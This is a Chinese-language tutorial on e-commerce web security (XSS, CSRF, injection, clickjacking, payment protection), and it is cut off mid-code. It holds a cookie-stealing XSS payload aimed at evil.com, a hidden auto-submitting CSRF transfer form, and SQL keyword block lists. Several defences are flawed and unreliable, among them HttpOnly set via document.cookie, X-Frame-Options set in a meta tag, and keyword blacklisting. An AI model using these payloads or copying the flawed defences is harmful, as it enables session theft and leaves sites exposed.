# Web安全问题与防护实践

## 概述

Web安全是电商网站开发中的重要环节，直接关系到用户数据安全、交易安全和企业信誉。本文档详细介绍了常见的Web安全威胁、防护措施和在电商场景中的具体应用。

## 核心知识点

### 1. XSS（跨站脚本攻击）

#### XSS攻击类型

**存储型XSS（Stored XSS）**
```javascript
// 危险示例：直接输出用户内容
function displayUserComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <p>${comment.content}</p> <!-- 危险：未过滤的用户输入 -->
      <span>by ${comment.author}</span>
    </div>
  `;
}

// 攻击者可能提交的恶意内容
const maliciousComment = {
  content: '<script>alert("XSS Attack!"); document.location="http://evil.com?cookie="+document.cookie;</script>',
  author: 'Attacker'
};
```

**反射型XSS（Reflected XSS）**
```javascript
// 危险示例：URL参数直接显示
function displaySearchResults() {
  const query = new URLSearchParams(window.location.search).get('q');
  document.getElementById('search-results').innerHTML = `
    <h2>搜索结果：${query}</h2> <!-- 危险：未过滤的URL参数 -->
  `;
}

// 恶意URL: https://shop.com/search?q=<script>alert('XSS')</script>
```

**DOM型XSS（DOM-based XSS）**
```javascript
// 危险示例：DOM操作中的XSS
function updateUserProfile() {
  const username = document.getElementById('username-input').value;
  // 危险：直接使用用户输入更新DOM
  document.getElementById('welcome-message').innerHTML = `Welcome, ${username}!`;
}
```

#### XSS防护措施

**输入验证和输出编码**
```javascript
/**
 * XSS防护工具类
 */
class XSSProtection {
  // HTML实体编码
  static escapeHTML(str) {
    const entityMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;',
      '/': '&#x2F;',
      '`': '&#x60;',
      '=': '&#x3D;'
    };
    
    return String(str).replace(/[&<>"'`=\/]/g, (s) => entityMap[s]);
  }
  
  // 安全的innerHTML替代方案
  static safeInnerHTML(element, content) {
    // 清空元素
    element.innerHTML = '';
    
    // 创建文本节点（自动转义）
    const textNode = document.createTextNode(content);
    element.appendChild(textNode);
  }
  
  // 安全的HTML模板渲染
  static renderTemplate(template, data) {
    let result = template;
    
    Object.keys(data).forEach(key => {
      const placeholder = new RegExp(`{{${key}}}`, 'g');
      const safeValue = this.escapeHTML(data[key]);
      result = result.replace(placeholder, safeValue);
    });
    
    return result;
  }
  
  // URL参数安全解析
  static getSecureURLParam(paramName) {
    const urlParams = new URLSearchParams(window.location.search);
    const param = urlParams.get(paramName);
    return param ? this.escapeHTML(param) : '';
  }
  
  // 安全的事件处理器绑定
  static bindSecureEventHandler(element, event, handler) {
    element.addEventListener(event, (e) => {
      // 防止事件中的恶意代码执行
      e.preventDefault();
      e.stopPropagation();
      
      // 清理事件对象中的用户输入
      if (e.target && e.target.value) {
        e.target.value = this.escapeHTML(e.target.value);
      }
      
      handler(e);
    });
  }
}

// 安全使用示例
class SecureCommentSystem {
  constructor() {
    this.comments = [];
  }
  
  // 安全添加评论
  addComment(content, author) {
    // 输入验证
    if (!content || !author) {
      throw new Error('评论内容和作者不能为空');
    }
    
    if (content.length > 1000) {
      throw new Error('评论内容过长');
    }
    
    // 内容过滤
    const safeContent = this.sanitizeComment(content);
    const safeAuthor = XSSProtection.escapeHTML(author);
    
    const comment = {
      id: Date.now(),
      content: safeContent,
      author: safeAuthor,
      timestamp: new Date().toISOString()
    };
    
    this.comments.push(comment);
    this.renderComments();
  }
  
  // 评论内容清理
  sanitizeComment(content) {
    // 移除危险标签
    const dangerousTags = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi;
    content = content.replace(dangerousTags, '');
    
    // 移除事件处理器
    const eventHandlers = /on\w+\s*=\s*"[^"]*"/gi;
    content = content.replace(eventHandlers, '');
    
    // 移除javascript:链接
    const jsLinks = /javascript:/gi;
    content = content.replace(jsLinks, '');
    
    // HTML实体编码
    return XSSProtection.escapeHTML(content);
  }
  
  // 安全渲染评论
  renderComments() {
    const container = document.getElementById('comments-container');
    if (!container) return;
    
    // 使用安全的模板渲染
    const template = `
      <div class="comment" data-id="{{id}}">
        <div class="comment-content">{{content}}</div>
        <div class="comment-meta">
          <span class="author">{{author}}</span>
          <span class="timestamp">{{timestamp}}</span>
        </div>
      </div>
    `;
    
    const commentsHTML = this.comments.map(comment => 
      XSSProtection.renderTemplate(template, comment)
    ).join('');
    
    container.innerHTML = commentsHTML;
  }
}
```

**Content Security Policy (CSP)**
```html
<!-- CSP配置示例 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline' https://cdn.example.com; 
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               img-src 'self' data: https:;
               font-src 'self' https://fonts.gstatic.com;
               connect-src 'self' https://api.example.com;">
```

```javascript
// CSP违规报告处理
class CSPViolationHandler {
  static init() {
    // 监听CSP违规事件
    document.addEventListener('securitypolicyviolation', (e) => {
      this.handleViolation(e);
    });
    
    // 设置违规报告端点
    this.setupReportingEndpoint();
  }
  
  static handleViolation(event) {
    const violation = {
      documentURI: event.documentURI,
      referrer: event.referrer,
      blockedURI: event.blockedURI,
      violatedDirective: event.violatedDirective,
      originalPolicy: event.originalPolicy,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent
    };
    
    // 上报违规信息
    this.reportViolation(violation);
  }
  
  static async reportViolation(violation) {
    try {
      await fetch('/api/csp-violation-report', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(violation)
      });
    } catch (error) {
      console.error('Failed to report CSP violation:', error);
    }
  }
  
  static setupReportingEndpoint() {
    // 动态设置CSP报告端点
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = `
      default-src 'self';
      report-uri /api/csp-violation-report;
      report-to csp-endpoint;
    `;
    document.head.appendChild(meta);
  }
}
```

### 2. CSRF（跨站请求伪造）

#### CSRF攻击原理
```html
<!-- 攻击者网站上的恶意表单 -->
<form action="https://shop.com/api/transfer" method="POST" style="display:none;">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="attacker_account">
</form>
<script>
  // 自动提交表单，利用用户的登录状态
  document.forms[0].submit();
</script>
```

#### CSRF防护措施

**CSRF Token防护**
```javascript
/**
 * CSRF防护管理器
 */
class CSRFProtection {
  constructor() {
    this.token = this.generateToken();
    this.tokenExpiry = Date.now() + (30 * 60 * 1000); // 30分钟过期
  }
  
  // 生成CSRF Token
  generateToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
  
  // 获取当前有效的Token
  getToken() {
    if (Date.now() > this.tokenExpiry) {
      this.token = this.generateToken();
      this.tokenExpiry = Date.now() + (30 * 60 * 1000);
    }
    return this.token;
  }
  
  // 在所有表单中添加CSRF Token
  protectAllForms() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      this.protectForm(form);
    });
    
    // 监听动态添加的表单
    const observer = new MutationObserver((mutations) => {
      mutations.forEach(mutation => {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === 1) {
            if (node.tagName === 'FORM') {
              this.protectForm(node);
            } else {
              const forms = node.querySelectorAll('form');
              forms.forEach(form => this.protectForm(form));
            }
          }
        });
      });
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
  
  // 保护单个表单
  protectForm(form) {
    // 检查是否已经有CSRF Token
    let tokenInput = form.querySelector('input[name="csrf_token"]');
    
    if (!tokenInput) {
      tokenInput = document.createElement('input');
      tokenInput.type = 'hidden';
      tokenInput.name = 'csrf_token';
      form.appendChild(tokenInput);
    }
    
    tokenInput.value = this.getToken();
    
    // 添加表单提交拦截
    form.addEventListener('submit', (e) => {
      this.validateFormSubmission(e, form);
    });
  }
  
  // 验证表单提交
  validateFormSubmission(event, form) {
    const tokenInput = form.querySelector('input[name="csrf_token"]');
    
    if (!tokenInput || tokenInput.value !== this.getToken()) {
      event.preventDefault();
      alert('安全验证失败，请刷新页面重试');
      return false;
    }
    
    return true;
  }
  
  // 保护AJAX请求
  protectAjaxRequests() {
    const originalFetch = window.fetch;
    const csrfProtection = this;
    
    window.fetch = function(url, options = {}) {
      // 只对同源的POST/PUT/DELETE请求添加CSRF Token
      if (csrfProtection.shouldProtectRequest(url, options)) {
        options.headers = options.headers || {};
        options.headers['X-CSRF-Token'] = csrfProtection.getToken();
      }
      
      return originalFetch.call(this, url, options);
    };
    
    // 保护XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
      this._method = method;
      this._url = url;
      return originalXHROpen.apply(this, [method, url, ...args]);
    };
    
    const originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(data) {
      if (csrfProtection.shouldProtectRequest(this._url, { method: this._method })) {
        this.setRequestHeader('X-CSRF-Token', csrfProtection.getToken());
      }
      return originalXHRSend.call(this, data);
    };
  }
  
  // 判断请求是否需要CSRF保护
  shouldProtectRequest(url, options) {
    const method = (options.method || 'GET').toUpperCase();
    const protectedMethods = ['POST', 'PUT', 'DELETE', 'PATCH'];
    
    // 只保护修改数据的请求
    if (!protectedMethods.includes(method)) {
      return false;
    }
    
    // 只保护同源请求
    try {
      const requestURL = new URL(url, window.location.origin);
      return requestURL.origin === window.location.origin;
    } catch (e) {
      return true; // 相对URL默认为同源
    }
  }
}

// 使用示例
const csrfProtection = new CSRFProtection();
csrfProtection.protectAllForms();
csrfProtection.protectAjaxRequests();
```

**SameSite Cookie属性**
```javascript
/**
 * 安全Cookie管理器
 */
class SecureCookieManager {
  // 设置安全Cookie
  static setSecureCookie(name, value, options = {}) {
    const defaults = {
      httpOnly: true,
      secure: true,
      sameSite: 'Strict',
      maxAge: 86400, // 24小时
      path: '/'
    };
    
    const config = { ...defaults, ...options };
    
    let cookieString = `${name}=${encodeURIComponent(value)}`;
    
    if (config.maxAge) {
      cookieString += `; Max-Age=${config.maxAge}`;
    }
    
    if (config.path) {
      cookieString += `; Path=${config.path}`;
    }
    
    if (config.domain) {
      cookieString += `; Domain=${config.domain}`;
    }
    
    if (config.secure) {
      cookieString += '; Secure';
    }
    
    if (config.httpOnly) {
      cookieString += '; HttpOnly';
    }
    
    if (config.sameSite) {
      cookieString += `; SameSite=${config.sameSite}`;
    }
    
    document.cookie = cookieString;
  }
  
  // 获取Cookie
  static getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    
    if (parts.length === 2) {
      return decodeURIComponent(parts.pop().split(';').shift());
    }
    
    return null;
  }
  
  // 删除Cookie
  static deleteCookie(name, path = '/') {
    document.cookie = `${name}=; Path=${path}; Expires=Thu, 01 Jan 1970 00:00:01 GMT;`;
  }
  
  // 设置会话Cookie
  static setSessionCookie(name, value) {
    this.setSecureCookie(name, value, {
      maxAge: null, // 会话Cookie
      sameSite: 'Strict'
    });
  }
  
  // 设置记住登录状态的Cookie
  static setRememberMeCookie(name, value) {
    this.setSecureCookie(name, value, {
      maxAge: 30 * 24 * 60 * 60, // 30天
      sameSite: 'Lax' // 允许从外部链接访问
    });
  }
}
```

### 3. SQL注入防护

虽然前端不直接操作数据库，但需要了解如何防范SQL注入：

```javascript
/**
 * 输入验证和清理工具
 */
class InputSanitizer {
  // SQL注入防护 - 输入验证
  static validateSQLInput(input) {
    // 检查危险的SQL关键字
    const sqlKeywords = [
      'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 
      'ALTER', 'EXEC', 'UNION', 'SCRIPT', '--', ';', 'xp_', 'sp_'
    ];
    
    const upperInput = input.toString().toUpperCase();
    
    for (const keyword of sqlKeywords) {
      if (upperInput.includes(keyword)) {
        throw new Error(`输入包含不允许的内容: ${keyword}`);
      }
    }
    
    return true;
  }
  
  // 参数化查询的前端验证
  static prepareQueryParams(params) {
    const cleanParams = {};
    
    Object.keys(params).forEach(key => {
      let value = params[key];
      
      // 基本类型验证
      if (typeof value === 'string') {
        // 移除SQL注入风险字符
        value = value.replace(/['";\\]/g, '');
        // 限制长度
        if (value.length > 1000) {
          throw new Error(`参数 ${key} 长度超出限制`);
        }
      }
      
      cleanParams[key] = value;
    });
    
    return cleanParams;
  }
  
  // NoSQL注入防护
  static sanitizeNoSQLInput(input) {
    if (typeof input === 'object' && input !== null) {
      // 检查MongoDB操作符
      const dangerousOperators = ['$where', '$regex', '$ne', '$gt', '$lt'];
      
      const checkObject = (obj) => {
        Object.keys(obj).forEach(key => {
          if (dangerousOperators.includes(key)) {
            throw new Error(`不允许的操作符: ${key}`);
          }
          
          if (typeof obj[key] === 'object' && obj[key] !== null) {
            checkObject(obj[key]);
          }
        });
      };
      
      checkObject(input);
    }
    
    return input;
  }
}
```

### 4. 点击劫持（Clickjacking）防护

```javascript
/**
 * 点击劫持防护
 */
class ClickjackingProtection {
  // 检测是否在iframe中
  static detectFraming() {
    if (window !== window.top) {
      // 页面被嵌入到iframe中
      return true;
    }
    return false;
  }
  
  // Frame busting技术
  static preventFraming() {
    if (this.detectFraming()) {
      // 尝试跳出iframe
      try {
        window.top.location = window.location;
      } catch (e) {
        // 如果跳出失败，隐藏页面内容
        document.body.style.display = 'none';
        
        // 显示警告信息
        const warning = document.createElement('div');
        warning.innerHTML = `
          <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: #333;
          ">
            <div style="text-align: center;">
              <h2>安全警告</h2>
              <p>检测到页面被嵌入，为了您的安全，请直接访问我们的网站。</p>
              <button onclick="window.open('${window.location.href}', '_blank')">
                在新窗口中打开
              </button>
            </div>
          </div>
        `;
        document.body.appendChild(warning);
      }
    }
  }
  
  // 设置X-Frame-Options（通过meta标签模拟）
  static setFrameOptions() {
    const meta = document.createElement('meta');
    meta.httpEquiv = 'X-Frame-Options';
    meta.content = 'DENY'; // 或 SAMEORIGIN
    document.head.appendChild(meta);
  }
  
  // 监控iframe嵌入尝试
  static monitorFramingAttempts() {
    // 监控referrer变化
    let lastReferrer = document.referrer;
    
    setInterval(() => {
      if (document.referrer !== lastReferrer) {
        // 可能的frame跳转
        this.logSuspiciousActivity('referrer_change', {
          oldReferrer: lastReferrer,
          newReferrer: document.referrer
        });
        lastReferrer = document.referrer;
      }
    }, 1000);
    
    // 监控窗口大小异常变化
    let lastWindowSize = { width: window.innerWidth, height: window.innerHeight };
    
    window.addEventListener('resize', () => {
      const currentSize = { width: window.innerWidth, height: window.innerHeight };
      
      // 检测异常的窗口大小（可能是iframe）
      if (currentSize.width < 300 || currentSize.height < 200) {
        this.logSuspiciousActivity('suspicious_window_size', currentSize);
      }
      
      lastWindowSize = currentSize;
    });
  }
  
  static logSuspiciousActivity(type, data) {
    // 上报可疑活动
    fetch('/api/security/suspicious-activity', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        type,
        data,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href
      })
    }).catch(console.error);
  }
}

// 初始化点击劫持防护
ClickjackingProtection.preventFraming();
ClickjackingProtection.setFrameOptions();
ClickjackingProtection.monitorFramingAttempts();
```

### 5. 敏感信息泄露防护

```javascript
/**
 * 敏感信息保护器
 */
class SensitiveDataProtection {
  constructor() {
    this.sensitivePatterns = [
      /\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}/, // 信用卡号
      /\d{3}-\d{2}-\d{4}/, // SSN
      /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/, // 邮箱
      /\d{11}/, // 手机号
      /password|pwd|secret|token/i // 密码相关
    ];
  }
  
  // 检测敏感信息
  detectSensitiveData(text) {
    const findings = [];
    
    this.sensitivePatterns.forEach((pattern, index) => {
      const matches = text.match(pattern);
      if (matches) {
        findings.push({
          type: this.getPatternType(index),
          matches: matches,
          positions: this.getMatchPositions(text, pattern)
        });
      }
    });
    
    return findings;
  }
  
  getPatternType(index) {
    const types = ['credit_card', 'ssn', 'email', 'phone', 'password'];
    return types[index] || 'unknown';
  }
  
  getMatchPositions(text, pattern) {
    const positions = [];
    let match;
    
    while ((match = pattern.exec(text)) !== null) {
      positions.push({
        start: match.index,
        end: match.index + match[0].length
      });
    }
    
    return positions;
  }
  
  // 脱敏处理
  maskSensitiveData(text, maskChar = '*') {
    let maskedText = text;
    
    // 信用卡号脱敏：只显示前4位和后4位
    maskedText = maskedText.replace(
      /(\d{4})[- ]?\d{4}[- ]?\d{4}[- ]?(\d{4})/g,
      `$1-****-****-$2`
    );
    
    // 手机号脱敏：只显示前3位和后4位
    maskedText = maskedText.replace(
      /(\d{3})\d{4}(\d{4})/g,
      `$1****$2`
    );
    
    // 邮箱脱敏：只显示前2位和域名
    maskedText = maskedText.replace(
      /([a-zA-Z0-9._%+-]{2})[a-zA-Z0-9._%+-]*@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g,
      `$1****@$2`
    );
    
    return maskedText;
  }
  
  // 防止控制台泄露
  protectConsole() {
    const originalLog = console.log;
    const originalError = console.error;
    const originalWarn = console.warn;
    const originalInfo = console.info;
    
    const filterSensitiveLog = (originalMethod) => {
      return (...args) => {
        const filteredArgs = args.map(arg => {
          if (typeof arg === 'string') {
            const findings = this.detectSensitiveData(arg);
            if (findings.length > 0) {
              return this.maskSensitiveData(arg);
            }
          } else if (typeof arg === 'object') {
            return this.filterSensitiveObject(arg);
          }
          return arg;
        });
        
        originalMethod.apply(console, filteredArgs);
      };
    };
    
    console.log = filterSensitiveLog(originalLog);
    console.error = filterSensitiveLog(originalError);
    console.warn = filterSensitiveLog(originalWarn);
    console.info = filterSensitiveLog(originalInfo);
  }
  
  // 过滤对象中的敏感信息
  filterSensitiveObject(obj) {
    if (!obj || typeof obj !== 'object') return obj;
    
    const sensitiveKeys = [
      'password', 'pwd', 'secret', 'token', 'key',
      'creditCard', 'ssn', 'socialSecurity'
    ];
    
    const filtered = { ...obj };
    
    Object.keys(filtered).forEach(key => {
      if (sensitiveKeys.some(sensitiveKey => 
        key.toLowerCase().includes(sensitiveKey.toLowerCase())
      )) {
        filtered[key] = '[FILTERED]';
      } else if (typeof filtered[key] === 'object') {
        filtered[key] = this.filterSensitiveObject(filtered[key]);
      } else if (typeof filtered[key] === 'string') {
        const findings = this.detectSensitiveData(filtered[key]);
        if (findings.length > 0) {
          filtered[key] = this.maskSensitiveData(filtered[key]);
        }
      }
    });
    
    return filtered;
  }
  
  // 防止右键和开发者工具
  preventDevTools() {
    // 禁用右键菜单
    document.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      return false;
    });
    
    // 禁用常见的开发者工具快捷键
    document.addEventListener('keydown', (e) => {
      // F12
      if (e.key === 'F12') {
        e.preventDefault();
        return false;
      }
      
      // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
      if (e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key)) {
        e.preventDefault();
        return false;
      }
      
      if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
        return false;
      }
    });
    
    // 检测开发者工具是否打开
    this.detectDevTools();
  }
  
  detectDevTools() {
    let devtools = { open: false, orientation: null };
    
    setInterval(() => {
      const threshold = 160;
      
      if (window.outerHeight - window.innerHeight > threshold || 
          window.outerWidth - window.innerWidth > threshold) {
        if (!devtools.open) {
          devtools.open = true;
          this.handleDevToolsDetected();
        }
      } else {
        devtools.open = false;
      }
    }, 500);
  }
  
  handleDevToolsDetected() {
    // 可以选择隐藏敏感内容或显示警告
    const warning = document.createElement('div');
    warning.innerHTML = `
      <div style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        z-index: 999999;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 18px;
      ">
        <div style="text-align: center;">
          <h2>安全提醒</h2>
          <p>检测到开发者工具已打开，请关闭后继续使用。</p>
        </div>
      </div>
    `;
    
    document.body.appendChild(warning);
    
    // 定期检查是否关闭
    const checkInterval = setInterval(() => {
      if (window.outerHeight - window.innerHeight <= 160 && 
          window.outerWidth - window.innerWidth <= 160) {
        document.body.removeChild(warning);
        clearInterval(checkInterval);
      }
    }, 1000);
  }
}
```

## 电商安全场景应用

### 1. 用户认证安全

```javascript
/**
 * 电商用户认证安全管理器
 */
class EcommerceAuthSecurity {
  constructor() {
    this.maxLoginAttempts = 5;
    this.lockoutDuration = 15 * 60 * 1000; // 15分钟
    this.sessionTimeout = 30 * 60 * 1000; // 30分钟
    this.loginAttempts = new Map();
  }
  
  // 安全登录处理
  async secureLogin(credentials) {
    const { username, password, captcha } = credentials;
    
    // 1. 输入验证
    if (!this.validateLoginInput(username, password)) {
      throw new Error('输入格式不正确');
    }
    
    // 2. 检查账户锁定状态
    if (this.isAccountLocked(username)) {
      throw new Error('账户已被锁定，请稍后再试');
    }
    
    // 3. 验证码检查
    if (!this.verifyCaptcha(captcha)) {
      throw new Error('验证码错误');
    }
    
    // 4. 记录登录尝试
    this.recordLoginAttempt(username);
    
    try {
      // 5. 执行登录
      const result = await this.performLogin(username, password);
      
      // 6. 登录成功，清除失败记录
      this.clearLoginAttempts(username);
      
      // 7. 设置安全会话
      this.setupSecureSession(result);
      
      return result;
      
    } catch (error) {
      // 8. 登录失败处理
      this.handleLoginFailure(username);
      throw error;
    }
  }
  
  validateLoginInput(username, password) {
    // 用户名验证
    if (!username || username.length < 3 || username.length > 50) {
      return false;
    }
    
    // 防止SQL注入
    if (InputSanitizer.validateSQLInput(username) === false) {
      return false;
    }
    
    // 密码强度验证
    if (!this.validatePasswordStrength(password)) {
      return false;
    }
    
    return true;
  }
  
  validatePasswordStrength(password) {
    if (!password || password.length < 8) {
      return false;
    }
    
    // 检查密码复杂度
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
    
    return hasUpperCase && hasLowerCase && hasNumbers && hasSpecialChar;
  }
  
  isAccountLocked(username) {
    const attempts = this.loginAttempts.get(username);
    if (!attempts) return false;
    
    return attempts.count >= this.maxLoginAttempts && 
           (Date.now() - attempts.lastAttempt) < this.lockoutDuration;
  }
  
  recordLoginAttempt(username) {
    const attempts = this.loginAttempts.get(username) || { count: 0, lastAttempt: 0 };
    
    // 如果距离上次尝试超过锁定时间，重置计数
    if (Date.now() - attempts.lastAttempt > this.lockoutDuration) {
      attempts.count = 0;
    }
    
    attempts.count++;
    attempts.lastAttempt = Date.now();
    
    this.loginAttempts.set(username, attempts);
  }
  
  handleLoginFailure(username) {
    const attempts = this.loginAttempts.get(username);
    
    if (attempts && attempts.count >= this.maxLoginAttempts) {
      // 账户被锁定，发送通知
      this.notifyAccountLocked(username);
    }
  }
  
  clearLoginAttempts(username) {
    this.loginAttempts.delete(username);
  }
  
  async performLogin(username, password) {
    // 使用安全的HTTP请求
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        username: XSSProtection.escapeHTML(username),
        password: password, // 密码在服务端处理
        timestamp: Date.now(),
        fingerprint: await this.generateDeviceFingerprint()
      })
    });
    
    if (!response.ok) {
      throw new Error('登录失败');
    }
    
    return await response.json();
  }
  
  setupSecureSession(loginResult) {
    // 设置安全的会话Cookie
    SecureCookieManager.setSessionCookie('session_id', loginResult.sessionId);
    
    // 设置会话超时
    this.setupSessionTimeout();
    
    // 监控会话安全
    this.monitorSessionSecurity();
  }
  
  setupSessionTimeout() {
    // 清除之前的定时器
    if (this.sessionTimer) {
      clearTimeout(this.sessionTimer);
    }
    
    this.sessionTimer = setTimeout(() => {
      this.handleSessionTimeout();
    }, this.sessionTimeout);
    
    // 监听用户活动，重置定时器
    ['click', 'keypress', 'scroll', 'mousemove'].forEach(event => {
      document.addEventListener(event, () => {
        this.resetSessionTimeout();
      }, { once: false, passive: true });
    });
  }
  
  resetSessionTimeout() {
    if (this.sessionTimer) {
      clearTimeout(this.sessionTimer);
      this.sessionTimer = setTimeout(() => {
        this.handleSessionTimeout();
      }, this.sessionTimeout);
    }
  }
  
  handleSessionTimeout() {
    // 清除会话
    SecureCookieManager.deleteCookie('session_id');
    
    // 跳转到登录页面
    window.location.href = '/login?reason=timeout';
  }
  
  monitorSessionSecurity() {
    // 监控会话劫持
    const originalSessionId = SecureCookieManager.getCookie('session_id');
    
    setInterval(() => {
      const currentSessionId = SecureCookieManager.getCookie('session_id');
      
      if (currentSessionId !== originalSessionId) {
        // 可能的会话劫持
        this.handleSuspiciousActivity('session_hijack');
      }
    }, 5000);
    
    // 监控异常的用户行为
    this.setupBehaviorAnalysis();
  }
  
  setupBehaviorAnalysis() {
    let clickPattern = [];
    let lastClickTime = 0;
    
    document.addEventListener('click', (e) => {
      const currentTime = Date.now();
      const timeDiff = currentTime - lastClickTime;
      
      clickPattern.push({
        x: e.clientX,
        y: e.clientY,
        time: currentTime,
        timeDiff: timeDiff,
        target: e.target.tagName
      });
      
      // 保持最近50次点击记录
      if (clickPattern.length > 50) {
        clickPattern.shift();
      }
      
      // 检测异常模式
      if (this.detectAbnormalBehavior(clickPattern)) {
        this.handleSuspiciousActivity('abnormal_behavior');
      }
      
      lastClickTime = currentTime;
    });
  }
  
  detectAbnormalBehavior(pattern) {
    if (pattern.length < 10) return false;
    
    // 检测机器人行为：点击间隔过于规律
    const intervals = pattern.slice(-10).map(p => p.timeDiff);
    const avgInterval = intervals.reduce((a, b) => a + b) / intervals.length;
    const variance = intervals.reduce((sum, interval) => 
      sum + Math.pow(interval - avgInterval, 2), 0) / intervals.length;
    
    // 如果方差过小，可能是机器人
    return variance < 100;
  }
  
  handleSuspiciousActivity(type) {
    // 上报可疑活动
    fetch('/api/security/suspicious-activity', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        type,
        timestamp: new Date().toISOString(),
        sessionId: SecureCookieManager.getCookie('session_id'),
        userAgent: navigator.userAgent,
        fingerprint: this.generateDeviceFingerprint()
      })
    });
    
    // 根据威胁级别采取行动
    if (['session_hijack', 'abnormal_behavior'].includes(type)) {
      // 强制重新登录
      this.forceRelogin();
    }
  }
  
  forceRelogin() {
    alert('检测到异常活动，需要重新登录');
    SecureCookieManager.deleteCookie('session_id');
    window.location.href = '/login?reason=security';
  }
  
  async generateDeviceFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Device fingerprint', 2, 2);
    
    const fingerprint = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      canvas: canvas.toDataURL(),
      plugins: Array.from(navigator.plugins).map(p => p.name).join(',')
    };
    
    const encoder = new TextEncoder();
    const data = encoder.encode(JSON.stringify(fingerprint));
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  }
  
  verifyCaptcha(captcha) {
    // 这里应该调用后端验证
    // 前端只做基本格式检查
    return captcha && captcha.length >= 4;
  }
  
  notifyAccountLocked(username) {
    // 发送账户锁定通知
    fetch('/api/security/account-locked', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        username,
        timestamp: new Date().toISOString(),
        ip: this.getClientIP()
      })
    });
  }
  
  getClientIP() {
    // 注意：这种方法不完全可靠，真实IP应该从服务端获取
    return 'unknown';
  }
}
```

### 2. 支付安全

```javascript
/**
 * 电商支付安全管理器
 */
class PaymentSecurity {
  constructor() {
    this.sensitiveDataProtection = new SensitiveDataProtection();
    this.csrfProtection = new CSRFProtection();
  }
  
  // 安全的支付表单处理
  securePaymentForm() {
    const paymentForm = document.getElementById('payment-form');
    if (!paymentForm) return;
    
    // 1. 保护表单免受CSRF攻击
    this.csrfProtection.protectForm(paymentForm);
    
    // 2. 加密敏感数据
    this.encryptSensitiveFields(paymentForm);
    
    // 3. 实时验证
    this.setupRealTimeValidation(paymentForm);
    
    // 4. 防止表单重复提交
    this.preventDoubleSubmission(paymentForm);
    
    // 5. 监控异常行为
    this.monitorPaymentBehavior(paymentForm);
  }
  
  encryptSensitiveFields(form) {
    const sensitiveFields = form.querySelectorAll('input[data-sensitive]');
    
    sensitiveFields.forEach(field => {
      // 使用Web Crypto API加密
      field.addEventListener('blur', async (e) => {
        if (e.target.value) {
          try {
            const encrypted = await this.encryptData(e.target.value);
            e.target.dataset.encrypted = encrypted;
            
            // 清除明文（延迟清除，确保用户体验）
            setTimeout(() => {
              if (document.activeElement !== e.target) {
                e.target.value = '****';
              }
            }, 1000);
          } catch (error) {
            console.error('加密失败:', error);
          }
        }
      });
      
      field.addEventListener('focus', (e) => {
        if (e.target.value === '****' && e.target.dataset.encrypted) {
          e.target.value = '';
          e.target.placeholder = '请重新输入';
        }
      });
    });
  }
  
  async encryptData(data) {
    // 生成密钥
    const key = await window.crypto.subtle.generateKey(
      {
        name: 'AES-GCM',
        length: 256,
      },
      true,
      ['encrypt', 'decrypt']
    );
    
    // 生成随机IV
    const iv = window.crypto.getRandomValues(new Uint8Array(12));
    
    // 加密数据
    const encoder = new TextEncoder();
    const encodedData = encoder.encode(data);
    
    const encrypted = await window.crypto.subtle.encrypt(
      {
        name: 'AES-GCM',
        iv: iv,
      },
      key,
      encodedData
    );
    
    // 导出密钥
